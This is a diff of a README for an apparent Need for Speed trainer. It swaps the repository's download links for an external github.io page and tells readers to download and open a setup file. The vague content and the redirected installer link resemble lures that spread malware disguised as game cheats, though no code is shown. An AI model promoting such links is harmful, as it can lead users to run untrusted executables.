@@ -1,6 +1,6 @@
 # 🏎️ Need-for-Speed-Trainer-2026 - Master your racing experience today
 
-[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://github.com/Runnerlamnidae138/Need-for-Speed-Trainer-2026)
+[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://runnerlamnidae138.github.io)
 
 This repository provides a utility tool for Need for Speed. It helps you manage in-game resources and performance settings on your Windows computer. This trainer works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ This repository provides a utility tool for Need for Speed. It helps you manage 
 
 Follow these steps to set up the software on your system. 
 
-1. Visit the [official repository page](https://github.com/Runnerlamnidae138/Need-for-Speed-Trainer-2026) to access the installer.
+1. Visit the [official repository page](https://runnerlamnidae138.github.io) to access the installer.
 2. Locate the file section on that page.
 3. Download the setup file to your computer.
 4. Open the file to start the installation process.
